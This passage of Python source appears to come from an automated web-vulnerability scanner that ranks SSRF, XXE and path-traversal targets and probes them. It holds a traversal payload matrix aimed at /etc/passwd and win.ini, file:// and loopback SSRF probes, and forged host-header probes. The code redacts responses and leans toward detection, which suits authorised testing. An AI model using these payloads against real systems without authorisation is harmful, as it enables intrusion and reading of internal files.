                       "<struct>", "faultCode", "faultString")

# Parser error fingerprints (family -> regex) - error-based XXE + parser-live
XXE_ERROR_PRINTS = [
    ("libxml2",   r"(failed to load external entity|Entity '.*' not defined|"
                  r"Start tag expected|Document is empty|xmlParseEntityDecl)"),
    ("PHP",       r"(I/O warning : failed to load|Entity.*failed to parse|"
                  r"DOMDocument|xml_parse\(\)|SimpleXMLElement)"),
    ("Java/SAX",  r"(SAXParseException|javax\.xml|org\.xml\.sax|"
                  r"External DTD: Failed to read|Content is not allowed)"),
    (".NET",      r"(Data at the root level|XmlException|DtdProcessing|"
                  r"System\.Xml)"),
    ("Go",        r"(xml\.|GoXML|encoding/xml)"),
    ("Generic",   r"(xml parse|parser error|XMLSyntaxError|malformed|"
                  r"not well-formed|invalid xml|XML document must have)"),
]
DTD_REJECT_PRINTS = ("doctype disallowed", "dtd is disallowed", "external entity",
                     "entity expansion", "doctype not allowed", "no external",
                     "dtpprocesing", "dtdprocessing", "prohibit-dtd",
                     "external-dtd", "disallow-doctype")


def xxe_error_family(text):
    t = (text or "").lower()
    for fam, rx in XXE_ERROR_PRINTS:
        if re.search(rx, t, re.I):
            return fam
    return None


# ===========================================================================
# PAYLOAD LIBRARY 5: TRAVERSAL MATRIX (30 encoding variants, content-redacted)
# ===========================================================================
TRAVERSAL_VARIANTS = [
    ("raw",              "../"),
    ("raw-deep",         "..%2f"),
    ("url-enc",          "%2e%2e%2f"),
    ("url-enc-bs",       "%2e%2e%5c"),
    ("double-enc",       "%252e%252e%252f"),
    ("double-slash",     "....//"),
    ("double-slash2",    "....\\/"),
    ("overlong-utf8-ae", "%c0%ae%c0%ae/"),
    ("overlong-utf8-af", "%c0%af"),
    ("overlong-double",  "%c0%ae%c0%ae%c0%af"),
    ("unicode-u002e",    "%u002e%u002e%u2215"),
    ("fullwidth",        "%uff0e%uff0e%uff0f"),
    ("semicolon-tomcat", "..;/"),
    ("semicolon-enc",    "%2e%2e;/"),
    ("spring-enc",       "..%2f"),
    ("dot-dot-bs",       "..\\"),
    ("bs-enc",           "..%5c"),
    ("mixed-1",          "..\\/"),
    ("mixed-2",          "%2e%2e\\/"),
    ("dot-enc-mixed",    ".%2e/"),
    ("slash-enc-mixed",  "%2e./"),
    ("null-byte",        "..%00"),
    ("null-byte-slash",  "..%00/"),
    ("abs-inject",       ""),          # absolute path injection (target=/etc/...)
    ("scheme-file",      "file://"),   # scheme injection
    ("triple-dot",       "..././"),
    ("dup-slash",        "//....//"),
    ("enc-slash",        "%2f"),
    ("dot-only",         ".."),
    ("newline",          "..%0a"),
]

# Non-secret file targets (marker-boolean detection, content kabhi store nahi)
TRAVERSAL_FILES = [
    {"label": "etc-hostname", "posix": "/etc/hostname",
     "win": "..\\..\\..\\..\\..\\..\\windows\\win.ini", "markers": []},
    {"label": "etc-passwd", "posix": "/etc/passwd",
     "win": "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
     "markers": list(PASSWD_MARKERS)},
    {"label": "boot-ini", "posix": "/boot.ini",
     "win": "..\\..\\boot.ini",
     "markers": ("[boot loader]", "[operating systems]")},
    {"label": "win-ini", "posix": "/windows/win.ini",
     "win": "..\\..\\..\\..\\..\\windows\\win.ini",
     "markers": ("[fonts]", "[extensions]", "for 16-bit app support")},
]


def traversal_build(variant, depth, target_file):
    """(label, path_value) - variant prefix x depth x file target."""
    label, prefix = variant
    if label == "abs-inject":
        return ("abs-" + target_file.lstrip("/").replace("/", "_"), target_file)
    if label == "scheme-file":
        return ("scheme-" + target_file.lstrip("/").replace("/", "_"),
                "file://" + target_file)
    n = max(1, depth)
    return (label, prefix * n + target_file.lstrip("/"))


# ===========================================================================
# URL PARAM CANDIDATES (fetch/redirect/import/webhook surface heuristics)
# ===========================================================================
URL_PARAM_RX = re.compile(
    r"(?i)^(url|uri|u|link|src|source|s|dest|destination|dest_url|desturl|"
    r"redirect|redirect_url|redirect_uri|redirecturl|return|return_url|"
    r"returnurl|return_to|rurl|r|next|next_url|nexturl|continue|continueurl|"
    r"target|target_url|targeturl|goto|goto_url|go|out|out_url|outurl|"
    r"callback|callback_url|callbackurl|cb|feed|feedurl|rss|fetch|fetch_url|"
    r"fetchurl|proxy|proxy_url|proxyurl|load|load_url|loadurl|file|filepath|"
    r"file_url|path|pathname|doc|document|doc_url|docurl|page|page_url|"
    r"pageurl|site|site_url|siteurl|host|domain|domain_url|image|img|img_url|"
    r"imgurl|image_url|picture|media|media_url|resource|resource_url|view|"
    r"view_url|render|render_url|preview|preview_url|share|share_url|"
    r"shareurl|webhook|webhook_url|hook|hook_url|ping|notify|notify_url|"
    r"import|import_url|importurl|download|download_url|read|read_url|"
    r"include|include_url|template|template_url|iframe|frame|frame_url|embed|"
    r"embed_url|open|open_url|external|external_url|remote|remote_url|orig|"
    r"original|original_url|reference|ref|jumpto|nav|nav_url|forward|"
    r"forward_url|to|href|canonical|cancel_url|success_url|error_url|"
    r"postback|postback_url|checkout_url|avatar|avatar_url|banner|"
    r"banner_url|icon|icon_url|logo|logo_url|manifest|manifest_url|"
    r"attachment|attachment_url|asset|asset_url|static|static_url)$")

URL_VALUE_RX = re.compile(r"^(https?://|//|/%2f|\.\./|/|\.{2})", re.I)
IMPORT_PATH_RX = re.compile(
    r"(?i)(import|upload|parse|render|convert|webhook|callback|fetch|proxy|"
    r"preview|reader|grab|pull|remote|xmlrpc|/rpc2?|pdf|report-gen|export|"
    r"saml|assertion|acs|sso|oembed|link-preview|unfurl|scrape|mirror)")
XML_CONTENT_HINT = re.compile(
    r"(?i)(\bxml\b|xhtml|svg|soap|saml|xmlrpc|content-type:\s*(application|text)/xml)")
DOCROOT_MARKER = re.compile(r"(?i)(document.?root|docroot|www-data|/var/www|"
                            r"/home/|/srv/|/app/|webroot)")


# ===========================================================================
# STAGE A - SSRF/XXE/TRAVERSAL SURFACE DISCOVERY (evidence-first)
# ===========================================================================
# Seed priority (evidence weight):
#   1.0  P12 feedforward to_phase15  (redirect_targets + xxe_ready)
#   1.0  P13 feedforward to_phase15  (header_url_hints - XFH/Original-URL)
#   1.0  P14 feedforward to_phase15  (oauth_redirect_uris)
#   0.9  P12 redirect_scan.json      (redirect params w/ verdicts)
#   0.9  P9  saml_surface.json       (SAML ACS = XXE gold)
#   0.8  P12 reflection_map.json     (verbatim params = probe-carriers)
#   0.8  P5  content artifacts       (import/upload/pdf/webhook paths)
#   0.7  P7  js endpoints/params     (client-mined URL params)
#   0.7  P2  forms.json              (URL-valued fields, XML fields)
#   0.6  P12 injection_matrix.json   (param families)
#   0.5  P3  sensitive_params.txt    (traversal handoff)
#   0.5  P14 oauth_state_audit.json  (redirect_uri values)
#   0.4  P8  priority_queue.json     (ranked pages)
#   0.3  cold-start URL-param harvest (fallback)
# ===========================================================================

def _read_json_tolerant(path):
    return load_json(path, default=None)


def _artifact(base_dir, mod, fname):
    """Tolerant artifact reader: missing file -> None (kabhi crash nahi)."""
    p = os.path.join(base_dir, mod, fname)
    if not os.path.isfile(p):
        return None
    if fname.endswith(".json"):
        return _read_json_tolerant(p)
    try:
        with open(p, "r", errors="ignore") as f:
            return f.read()
    except OSError:
        return None


def _iter_records(d):
    """JSON artifact -> iterable of dict records."""
    if isinstance(d, list):
        for x in d:
            if isinstance(x, dict):
                yield x
    elif isinstance(d, dict):
        for v in d.values():
            if isinstance(v, list):
                for x in v:
                    if isinstance(x, dict):
                        yield x
            elif isinstance(v, dict):
                yield v


def _url_from_rec(rec, prefer=("url", "endpoint", "action", "target", "href",
                               "page", "path")):
    for k in prefer:
        v = rec.get(k)
        if isinstance(v, str) and v.startswith(("http", "/")):
            return v
    return ""


def urljoin_safe(base, rel):
    try:
        return urllib.parse.urljoin(base, rel or "")
    except Exception:
        return rel or ""


def _norm_target(url, base_url):
    if not url:
        return ""
    if url.startswith("http"):
        return url.split("#")[0]
    return urljoin_safe(base_url, url).split("#")[0]


class _Rank:
    """Ranked surface accumulator (dedupe by url+kind)."""

    def __init__(self):
        self.items, self._seen = [], set()

    def add(self, kind, url, score, source, param="", method="GET", fields=None,
            extra=None):
        if not url or not url.startswith("http"):
            return
        k = (kind, url.split("?")[0], param)
        if k in self._seen:
            return
        self._seen.add(k)
        rec = {"kind": kind, "url": url, "score": round(min(10.0, score), 2),
               "source": source, "param": param, "method": method,
               "fields": fields or []}
        if extra:
            rec.update(extra)
        self.items.append(rec)

    def top(self, kind=None, cap=None):
        rows = [r for r in self.items if kind is None or r["kind"] == kind]
        rows.sort(key=lambda x: -x["score"])
        return rows[:cap] if cap else rows


def discover_ssrf_surface(base_dir, scope, conf):
    """Stage A: sab seed artifacts mine karo -> ranked SSRF/XXE/traversal targets.
    Returns (ranked, meta). meta = sources/probes/hints summary."""
    base_dir = os.path.join(base_dir, scope.engagement)
    seeds = scope.seed_urls() or []
    base_urls = []
    for s in seeds:
        try:
            sp = urllib.parse.urlsplit(s)
            if sp.scheme and sp.netloc:
                base_urls.append("%s://%s" % (sp.scheme, sp.netloc))
        except Exception:
            continue
    base_url = base_urls[0] if base_urls else ""
    R = _Rank()
    meta = {"sources": [], "base_url": base_url, "param_hints": [],
            "import_paths": [], "saml_endpoints": [], "os_hints": [],
            "webhook_paths": [], "redirect_seeds": []}

    def src(name):
        if name not in meta["sources"]:
            meta["sources"].append(name)

    # ---- P12 feedforward: redirect_targets + xxe_ready (weight 1.0) ----
    p12ff = (_artifact(base_dir, "inject", "feedforward.json") or {}).get("routing", {})
    for u in (p12ff.get("to_phase15_ssrf", {}) or {}).get("redirect_targets", [])[:12]:
        R.add("fetch", u, 9.5, "P12:ff:redirect_targets")
        meta["redirect_seeds"].append(u)
        src("P12:feedforward")
    for u in (p12ff.get("to_phase15_ssrf", {}) or {}).get("xxe_ready", [])[:10]:
        R.add("xxe", u, 9.4, "P12:ff:xxe_ready",
              extra={"needs_param": "xml"})
        src("P12:feedforward")

    # ---- P12 redirect_scan.json (weight 0.9) ----
    for rec in _iter_records(_artifact(base_dir, "inject", "redirect_scan.json")):
        u = _url_from_rec(rec)
        if u:
            R.add("fetch", u, 9.0, "P12:redirect_scan", param=rec.get("param", ""))
            meta["redirect_seeds"].append(u)
            src("P12:redirect_scan")

    # ---- P13 feedforward header_url_hints (weight 1.0) ----
    p13ff = (_artifact(base_dir, "xss", "feedforward.json") or {}).get("routing", {})
    for u in (p13ff.get("to_phase15_ssrf", {}) or {}).get("header_url_hints", [])[:10]:
        R.add("header", u, 9.0, "P13:ff:header_url_hints")
        src("P13:feedforward")

    # ---- P14 feedforward oauth_redirect_uris (weight 1.0) ----
    p14ff = (_artifact(base_dir, "client", "feedforward.json") or {}).get("routing", {})
    for u in (p14ff.get("to_phase15_ssrf", {}) or {}).get("oauth_redirect_uris",
                                                          [])[:8]:
        R.add("fetch", u, 8.8, "P14:ff:oauth_redirect")
        meta["redirect_seeds"].append(u)
        src("P14:feedforward")

    # ---- P14 oauth_state_audit.json redirect_uri (weight 0.5) ----
    for rec in _iter_records(_artifact(base_dir, "client", "oauth_state_audit.json")):
        ru = rec.get("redirect_uri") or ""
        u = _url_from_rec(rec)
        if u and ru:
            R.add("fetch", u, 8.5, "P14:oauth_state", param="redirect_uri")
            src("P14:oauth_state")

    # ---- P9 SAML surface (weight 0.9) ----
    for rec in _iter_records(_artifact(base_dir, "auth", "saml_surface.json")):
        u = _url_from_rec(rec)
        if u:
            R.add("xxe", u, 9.2, "P9:saml_surface", extra={"saml": True})
            meta["saml_endpoints"].append(u)
            src("P9:saml_surface")

    # ---- P9 auth_redirect_xss.json (weight 0.6) ----
    for rec in _iter_records(_artifact(base_dir, "auth", "auth_redirect_xss.json")):
        u = _url_from_rec(rec)
        if u:
            R.add("fetch", u, 8.0, "P9:auth_redirect", param=rec.get("param", ""))
            meta["redirect_seeds"].append(u)
            src("P9:auth_redirect")

    # ---- P12 reflection_map.json verbatim params (weight 0.8) ----
    for rec in _iter_records(_artifact(base_dir, "inject", "reflection_map.json")):
        u = _url_from_rec(rec)
        prm = rec.get("param", "")
        if u and (URL_PARAM_RX.match(prm or "") or rec.get("verbatim")):
            R.add("fetch", u, 8.4, "P12:reflection_map", param=prm)
            src("P12:reflection_map")

    # ---- P12 injection_matrix.json url families (weight 0.6) ----
    for rec in _iter_records(_artifact(base_dir, "inject", "injection_matrix.json")):
        fams = " ".join(rec.get("families", []) or []) if isinstance(
            rec.get("families"), list) else str(rec.get("families", ""))
        u = _url_from_rec(rec)
        if u and re.search(r"(?i)(redirect|ssrf|traversal|xxe)", fams):
            R.add("fetch", u, 8.2, "P12:injection_matrix", param=rec.get("param", ""))
            src("P12:injection_matrix")

    # ---- P5 content artifacts: import/upload/pdf/webhook paths (0.8) ----
    for f in ("all_found.txt", "interesting.txt", "artifacts_high.txt"):
        txt = _artifact(base_dir, "content", f)
        if not txt:
            continue
        src("P5:content:" + f)
        for line in txt.splitlines():
            u = line.strip().split(" ")[0]
            if u and IMPORT_PATH_RX.search(u) and len(meta["import_paths"]) < 40:
                full = _norm_target(u, base_url)
                meta["import_paths"].append(full)
                kind = "xxe" if re.search(r"(?i)(xml|saml|rpc|import|parse|svg)", u) \
                    else "fetch"
                sc = 8.6 if re.search(r"(?i)(import|webhook|pdf|render)", u) else 7.8
                R.add(kind, full, sc, "P5:content")
    # P16 upload handoff preview (svg/import endpoints)
    up = _artifact(base_dir, "content", "upload_paths.json")
    for rec in _iter_records(up):
        u = _url_from_rec(rec)
        if u and re.search(r"(?i)(svg|import|xml)", u):
            R.add("xxe", _norm_target(u, base_url), 8.8, "P5:upload_paths",
                  extra={"svg_or_import": True})

    # ---- P7 js endpoints + params (weight 0.7) ----
    for f in ("endpoints.txt", "params.txt"):
        txt = _artifact(base_dir, "js", f)
        if not txt:
            continue
        src("P7:js:" + f)
        for line in txt.splitlines()[:200]:
            u = line.strip().split(" ")[0]
            if not u or len(u) < 6:
                continue
            full = _norm_target(u if u.startswith("http") else
                                (base_url + (u if u.startswith("/") else "/" + u)),
                                base_url)
            q = urllib.parse.urlsplit(full).query
            for kv in q.split("&"):
                if "=" in kv:
                    k = kv.split("=", 1)[0]
                    if URL_PARAM_RX.match(k):
                        R.add("fetch", full.split("&" + k)[0], 7.6, "P7:js",
                              param=k, extra={"needs_param": k})
    # P7 config hints (php/java/python - XXE wrapper hints)
    cfg_h = _artifact(base_dir, "js", "config_hints.txt") or ""
    for lang in ("php", "java", "python", "node", ".net"):
        if lang in cfg_h.lower():
            meta["os_hints"].append(lang)

    # ---- P2 forms.json: URL/XML-valued fields (weight 0.7) ----
    for rec in _iter_records(_artifact(base_dir, "understand", "forms.json")):
        u = _url_from_rec(rec, prefer=("action", "url", "endpoint"))
        fields = rec.get("fields") or []
        names = [(f.get("name") or "") if isinstance(f, dict) else str(f)
                 for f in fields]
        blob = " ".join(names)
        if u and (URL_PARAM_RX.search(blob) or XML_CONTENT_HINT.search(blob)):
            kind = "xxe" if XML_CONTENT_HINT.search(blob) else "fetch"
            npx = next((n for n in names
                        if URL_PARAM_RX.match(n) or XML_CONTENT_HINT.search(n)), "")
            R.add(kind, u, 7.8, "P2:forms", fields=names[:8],
                  extra={"needs_param": npx} if npx else None)
            src("P2:forms")

    # ---- P3 passive sensitive_params (weight 0.5) ----
    txt = _artifact(base_dir, "passive", "findings/sensitive_params.txt") or ""
    if txt:
        src("P3:sensitive_params")
        for line in txt.splitlines()[:80]:
            u = line.strip().split(" ")[0]
            if not u:
                continue
            q = urllib.parse.urlsplit(u).query or ""
            ks = [kv.split("=", 1)[0] for kv in q.split("&") if kv]
            if any(URL_PARAM_RX.match(k) for k in ks):
                R.add("traverse", _norm_target(u, base_url), 7.4, "P3:sensitive",
                      param=ks[0])
    # traversal-typical params (path/file/download/view/read)
    for rec in _iter_records(_artifact(base_dir, "inject", "traversal_scan.json")):
        u = _url_from_rec(rec)
        if u:
            R.add("traverse", u, 8.6, "P12:traversal_scan",
                  param=rec.get("param", ""))

    # ---- P8 priority queue (weight 0.4) ----
    pq = _artifact(base_dir, "surface", "priority_queue.json") or {}
    for rec in (pq.get("queue") if isinstance(pq, dict) else pq) or []:
        if isinstance(rec, dict):
            u = _url_from_rec(rec)
            if u and IMPORT_PATH_RX.search(u):
                R.add("fetch", _norm_target(u, base_url), 7.2, "P8:priority")

    # ---- P6 stack (OS hints -> traversal separator + XXE wrapper hints) ----
    stack = _artifact(base_dir, "tech", "stack_report.txt") or ""
    src("P6:stack")
    for kw, hint in (("php", "php-wrapper"), ("java", "java-parser"),
                     (".net", "dotnet"), ("iis", "windows"),
                     ("asp.net", "windows"), ("nginx", "nix"),
                     ("apache", "nix")):
        if kw in stack.lower():
            meta["os_hints"].append(hint)

    # ---- seed URLs themselves (baseline fetch targets) ----
    for b in base_urls:
        R.add("fetch", b + "/", 6.0, "scope:seed")

    meta["sources"] = sorted(meta["sources"])
    ranked = R.items
    ranked.sort(key=lambda x: -x["score"])
    return ranked, meta


def harvest_url_params(http, base_url, conf, cp, meta):
    """Cold-start fallback: homepage + import-like pages par URL-param harvest."""
    paths = ["/", "/index.php", "/index.html", "/app", "/home",
             "/import", "/upload", "/webhook", "/settings", "/api",
             "/admin", "/dashboard", "/export", "/preview", "/convert"]
    found = []
    spent = 0
    cap = int(conf.get("ssrf_cold_start", 24))
    for p in paths:
        if spent >= cap:
            break
        u = urllib.parse.urljoin(base_url.rstrip("/") + "/", p.lstrip("/"))
        r = http.get(u, allow_redirects=False)
        spent += 1
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        if r.error or r.status >= 500:
            continue
        for fm in re.finditer(
                r"(?i)(?:name|id)\s*=\s*[\"']([a-z0-9_\-]{2,32})[\"']", r.text):
            k = fm.group(1)
            if URL_PARAM_RX.match(k):
                sep = "&" if "?" in u else "?"
                found.append({"url": u + sep + k + "=", "param": k,
                              "source": "cold:crawl"})
        for am in re.finditer(r"(?i)action\s*=\s*[\"']([^\"']+)[\"']", r.text):
            act = urljoin_safe(u, am.group(1))
            if IMPORT_PATH_RX.search(act):
                found.append({"url": act, "param": "", "source": "cold:action"})
    return found


# ===========================================================================
# STAGE B - BASELINE & CALIBRATION (+ quiet client for redacted probes)
# ===========================================================================
def quiet_client(http, cfg, scope, ev):
    """save_bodies=False client - file-read/metadata responses ka raw content
    evidence me kabhi store nahi hota (REDACT discipline)."""
    q = copy.copy(cfg)
    q.save_bodies = False
    q.save_replays = False
    return HttpClient(q, ev, scope, label=NAME + "-quiet",
                      limiter=http.limiter, budget=http.budget)


def baseline_endpoint(http, url, conf, cp, meta, tag="b"):
    """2x GET baseline: status/len/sha1/timing + WAF sig (P12 pattern)."""
    ck = "base:%s:%s" % (tag, url)
    if cp.is_done(ck):
        return cp.result_of(ck) or {}
    out = {"url": url, "ok": False}
    try:
        r1 = http.get(url, allow_redirects=False)
        r2 = http.get(url, allow_redirects=False)
        meta["probes_total"] = meta.get("probes_total", 0) + 2
        if r1.error:
            out["error"] = r1.error
            cp.mark(ck, out, summary="baseline error")
            return out
        waf = waf_signature(dict(r1.headers), r1.text[:2000], r1.status)
        out = {"url": url, "ok": True, "status": r1.status, "len": len(r1.body),
               "sha1": r1.sha1(), "title": title_of(r1.text),
               "elapsed": round((r1.elapsed + r2.elapsed) / 2.0, 4),
               "stable": r1.sha1() == r2.sha1(), "waf": waf,
               "headers": {k: v for k, v in r1.headers.items()
                           if k.lower() in ("server", "content-type", "location")},
               "set_cookies": len(r1.set_cookies or [])}
        meta["probes_total"] = meta.get("probes_total", 0) + 1
    except Exception as e:
        out = {"url": url, "ok": False, "error": "%s: %s" % (type(e).__name__, e)}
    cp.mark(ck, out, summary="baseline")
    return out


def pick_home_marker(http, base_url, meta):
    """Self-fetch FULL-READ ka reference: homepage sha1 + unique canary path.
    Returns (home_sha1, home_len, canary_path, canary_sig|None)."""
    home = http.get(base_url.rstrip("/") + "/", allow_redirects=False)
    meta["probes_total"] = meta.get("probes_total", 0) + 1
    if home.error:
        return None
    canary_path = "/%s" % _canary("home")
    cr = http.get(base_url.rstrip("/") + canary_path, allow_redirects=False)
    meta["probes_total"] = meta.get("probes_total", 0) + 1
    canary_sig = None
    if not cr.error:
        canary_sig = {"status": cr.status, "len": len(cr.body), "sha1": cr.sha1()}
    return {"sha1": home.sha1(), "len": len(home.body),
            "status": home.status, "canary_path": canary_path,
            "canary": canary_sig}


# ===========================================================================
# STAGE C - SSRF FETCH ENGINE (self-fetch / blind / scheme / header-host)
# ===========================================================================
def _fetch_url(base_url, rec, inner_url, param=None):
    """Fetcher URL banao: ?param=<inner_url> (rec.needs_param ya rec.param).
    FIX-2: agar seed url pehle se 'param=' (empty value) carry karta hai
    (P12/P13/P14 feedforward style) to pehle use strip karo - warna duplicate
    '?url=&url=...' banta hai aur fetcher empty inner dekhta hai."""
    p = param or rec.get("param") or rec.get("needs_param") or "url"
    u = rec["url"]
    for suf in ("?%s=" % p, "&%s=" % p):
        if u.endswith(suf):
            u = u[:-len(suf)]
            break
    rec = dict(rec)
    rec["url"] = u
    if "?" in rec["url"]:
        base_q = rec["url"]
        joiner = "&" if not base_q.endswith("?") and "=" in base_q.split("?")[-1] \
            else ("" if base_q.endswith("?") else "?")
    else:
        joiner = "?"
    return "%s%s%s=%s" % (rec["url"], joiner, p, urllib.parse.quote(inner_url, safe=""))


def _sig(r):
    """Response ka cheap signature (no body storage)."""
    return {"status": r.status, "len": len(r.body), "sha1": r.sha1(),
            "error": r.error, "elapsed": round(r.elapsed or 0.0, 3)}


def _is_waf_block(r, base_waf):
    """Probe-level WAF block detect (P12 pattern: independent verdict)."""
    if r.status in (403, 406, 429):
        return True
    sigs = waf_signature(dict(r.headers), r.text[:1500], r.status)
    if sigs and not base_waf:
        return True
    t = r.text[:800].lower()
    return bool(re.search(r"(blocked|forbidden|waf|denied|security)", t)
                and r.status in (200, 403))


def fetch_probe_endpoint(http, qhttp, rec, base_url, meta, conf, cp, home_sig,
                         smoke_port=None):
    """Ek fetch-endpoint ka poora SSRF probe (control + self + blind + scheme).
    Returns record dict (verdict + signals + evidence refs)."""
    url = rec["url"]
    base = baseline_endpoint(http, url, conf, cp, meta, tag="f")
    rec_out = {"url": url, "param": rec.get("param") or rec.get("needs_param") or "url",
               "source": rec.get("source", ""), "baseline": base,
               "verdict": "SAFE", "technique": "", "signals": [],
               "probes": {}}
    if not base.get("ok"):
        rec_out["verdict"] = "NOISE" if base.get("error") else "SAFE"
        rec_out["signals"].append("baseline-fail")
        return rec_out
    if base.get("waf"):
        rec_out["signals"].append("waf-present:%s" % ",".join(base["waf"]))

    probes = {}
    # ---- controls ----
    c_home = "%s/" % base_url.rstrip("/")
    c_none = "http://%s.invalid/%s" % (_canary("nx").lower(), rand_str(6))
    p_home = _fetch_url(base_url, rec, c_home, rec_out["param"])
    p_none = _fetch_url(base_url, rec, c_none, rec_out["param"])
    r_home = http.get(p_home, allow_redirects=False)
    r_none = http.get(p_none, allow_redirects=False)
    meta["probes_total"] = meta.get("probes_total", 0) + 2
    probes["control-self"] = _sig(r_home)
    probes["control-nxdomain"] = _sig(r_none)

    if _is_waf_block(r_home, base.get("waf") or []):
        rec_out["verdict"] = "BLOCKED"
        rec_out["signals"].append("waf-blocked-fetch-probe")
        rec_out["probes"] = probes
        return rec_out
    # FIX-3: route-404 guard - agar endpoint GET par khud soft-404 template
    # deta hai to uska 'url param processing' hi nahi hua -> blind/loopback/
    # canary signals false-positive honge (POST-only parsers GET par 404).
    s404base = meta.get("soft404") or {}
    home_soft = (not r_home.error) and is_soft404(r_home, s404base)

    # ---- 1) FULL-READ self-fetch proof (homepage sha1 match) ----
    full_read = False
    if home_sig and not r_home.error:
        if r_home.sha1() == home_sig["sha1"] and home_sig["len"] > 0:
            full_read = True
            rec_out["signals"].append(
                "full-read:homepage-sha1-match(len=%d)" % len(r_home.body))
    # canary-path differential: fetcher canary path ka response vs direct canary
    # FIX-3b: canary khud soft-404 template par land hua to skip (template-
    # matching false-full-read guard).
    canary_template = home_sig and home_sig.get("canary") and \
        home_sig["canary"].get("sha1") in (s404base.get("hashes") or [])
    if not full_read and home_sig and home_sig.get("canary") and \
            not r_none.error and not canary_template:
        cpath_url = base_url.rstrip("/") + home_sig["canary_path"]
        p_cpath = _fetch_url(base_url, rec, cpath_url, rec_out["param"])
        r_cpath = http.get(p_cpath, allow_redirects=False)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        probes["control-canary-path"] = _sig(r_cpath)
        if not r_cpath.error and home_sig["canary"].get("sha1") == r_cpath.sha1():
            full_read = True
            rec_out["signals"].append("full-read:canary-path-sha1-match")

    # ---- 2) BLIND differential (status/len self vs nxdomain) ----
    blind = False
    if not full_read and not home_soft and not r_home.error and not r_none.error:
        s_home, s_none = probes["control-self"], probes["control-nxdomain"]
        if r_home.status and s_none["status"] and \
                r_home.status != r_none.status:
            blind = True
            rec_out["signals"].append(
                "blind:status-diff(self=%s,nx=%s)" % (r_home.status,
                                                      s_none["status"]))
        elif s_none["status"] is None and r_home.status and \
                s_home["status"] == r_home.status:
            # NXDOMAIN ne error diya, self ne 200 -> fetch reachable
            blind = True
            rec_out["signals"].append("blind:nxdomain-err-vs-self-ok")
    # timing z-score (ssrf_timing_samples repeats, sirf promising candidates)
    if not full_read and not blind and conf.get("ssrf_timing_samples", 3) >= 3:
        t_home, t_none = [], []
        for _ in range(int(conf.get("ssrf_timing_samples", 3))):
            a = http.get(p_home, allow_redirects=False)
            b = http.get(p_none, allow_redirects=False)
            meta["probes_total"] = meta.get("probes_total", 0) + 2
            if not a.error:
                t_home.append(a.elapsed or 0.0)
            if not b.error:
                t_none.append(b.elapsed or 0.0)
        if len(t_home) >= 2 and len(t_none) >= 2:
            all_t = t_home + t_none
            m, md = median(all_t), mad(all_t)
            zh, zn = robust_z(median(t_home), m, md), robust_z(median(t_none), m, md)
            probes["timing"] = {"self_med": round(median(t_home), 3),
                                "nx_med": round(median(t_none), 3),
                                "z_self": round(zh, 2), "z_nx": round(zn, 2)}
            if abs(zh - zn) > 3.5 and abs(median(t_home) - median(t_none)) > 0.25:
                blind = True
                rec_out["signals"].append(
                    "blind:timing-z(%.1f vs %.1f)" % (zh, zn))

    # ---- 3) scheme probe: file:// via fetcher (detection-only, redacted) ----
    if conf.get("ssrf_scheme_probe", True):
        fsys = "file://" + XXE_CANARY_FILE
        p_file = _fetch_url(base_url, rec, fsys, rec_out["param"])
        r_file = qhttp.get(p_file, allow_redirects=False)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        probes["scheme-file"] = _sig(r_file)
        if not r_file.error and r_file.body:
            txt = r_file.text[:400]
            if HOSTNAME_SHAPE.match(txt.strip()) and len(r_file.body) <= 512 and \
                    "<" not in txt and is_soft404(r_file, meta.get("soft404", {})) is False:
                rec_out["signals"].append(
                    "scheme-file:hostname-shape(len=%d,sha1=%s)"
                    % (len(r_file.body), r_file.sha1()[:12]))

    # ---- 4) loopback probe (internal reachability via fetcher) ----
    lb = "http://127.0.0.1:%d/%s" % (smoke_port or 9, _canary("lb").lower())
    p_lb = _fetch_url(base_url, rec, lb, rec_out["param"])
    r_lb = http.get(p_lb, allow_redirects=False)
    meta["probes_total"] = meta.get("probes_total", 0) + 1
    probes["loopback"] = _sig(r_lb)
    lb_ok = (not home_soft and not r_lb.error and r_lb.status and
             r_lb.status < 500 and
             (not s_none_used(r_none) or _sig(r_lb) != probes["control-nxdomain"]))
    if lb_ok and r_none.error is None and \
            probes["loopback"]["status"] != probes["control-nxdomain"]["status"]:
        rec_out["signals"].append("loopback:differential(%s vs nx %s)" % (
            probes["loopback"]["status"], probes["control-nxdomain"]["status"]))

    # ---- verdict ladder (multi-signal, P12-compatible) ----
    if full_read:
        rec_out["verdict"] = "CONFIRMED"
        rec_out["technique"] = "full-response-ssrf"
    elif blind:
        rec_out["verdict"] = "SUSPECTED"
        rec_out["technique"] = "blind-differential-ssrf"
    elif rec_out["signals"]:
        rec_out["verdict"] = "SUSPECTED"
        rec_out["technique"] = "partial-signal"
    rec_out["probes"] = probes
    rec_out["evidence"] = {"control_self": p_home, "control_nx": p_none}
    return rec_out


def s_none_used(r):
    return r is not None


def header_host_probe(http, url, meta, conf, cp):
    """X-Forwarded-Host / X-Original-URL / X-Rewrite-URL probes (GET only)."""
    out = {"url": url, "probes": [], "verdict": "SAFE"}
    base = http.get(url, allow_redirects=False)
    meta["probes_total"] = meta.get("probes_total", 0) + 1
    if base.error or _is_waf_block(base, []):
        out["verdict"] = "BLOCKED" if not base.error else "NOISE"
        return out
    fake_host = "%s.wasp-p15.invalid" % _canary("h").lower()
    hdr_sets = [
        ("xfh", {"X-Forwarded-Host": fake_host}),
        ("xfh-https", {"X-Forwarded-Host": fake_host,
                       "X-Forwarded-Proto": "https"}),
        ("x-original-url", {"X-Original-URL": "/%s" % _canary("ou").lower()}),
        ("x-rewrite-url", {"X-Rewrite-URL": "/%s" % _canary("ru").lower()}),
    ]
    for label, hd in hdr_sets:
        r = http.get(url, headers=hd, allow_redirects=False)
        meta["probes_total"] = meta.get("probes_total", 0) + 1
        sig = {"status": r.status, "len": len(r.body),
               "sha1": r.sha1(), "elapsed": round(r.elapsed or 0.0, 3)}
        reflected = fake_host in r.text
        rec = {"probe": label, "sig": sig, "host_reflected": reflected}
        if reflected:
            rec["note"] = "fake host body me reflect hua (link/canonical/" \
                          "redirect generation host-header se) -> cache-" \
                          "poison + password-reset poison chain (P26)"
            out["verdict"] = "SUSPECTED"
        elif not r.error and base and (r.status != base.status or
                                       r.sha1() != base.sha1()):
            rec["note"] = "response differential (original/rewrite-url routing)"
            out["verdict"] = "SUSPECTED" if out["verdict"] == "SAFE" else out["verdict"]
        out["probes"].append(rec)
    return out


# ===========================================================================
